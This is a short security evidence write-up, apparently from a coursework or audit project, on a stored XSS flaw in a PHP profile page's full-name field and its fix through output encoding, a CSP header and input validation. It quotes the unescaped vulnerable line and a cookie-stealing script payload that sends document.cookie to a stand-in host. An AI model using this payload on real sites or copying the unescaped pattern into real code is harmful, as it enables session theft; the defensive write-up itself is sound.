# Evidence 3 — Stored XSS on Profile Full Name

## Before (vulnerable pattern)
File: `public/profile.php` (original prototype)

```php
<p>Current display name: <strong><?= $user['full_name'] ?></strong></p>
```
Submitting a full name of `<script>document.location='https://evil.test/steal?c='+document.cookie</script>`
via the profile form would store that string verbatim and then execute it in the browser of
anyone who later views the page — including an admin viewing a student roster, enabling session
theft or actions performed as that admin.

## After (fixed)
File: `public/profile.php`, helper in `src/bootstrap.php`

```php
function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
```
```php
<p>Current display name: <strong><?= e($user['full_name']) ?></strong></p>
```
The same payload is now emitted as literal text (`&lt;script&gt;...&lt;/script&gt;`) and
rendered as visible characters instead of running. `src/security_headers.php` also sends
`Content-Security-Policy: script-src 'self'` with no `'unsafe-inline'`, so even a field that
was missed by output encoding could not execute an inline `<script>` payload — defense in depth
rather than a single control.

Server-side input validation (`is_valid_full_name()` in `src/validate.php`) additionally
rejects angle brackets before the value is ever stored, as a third layer.
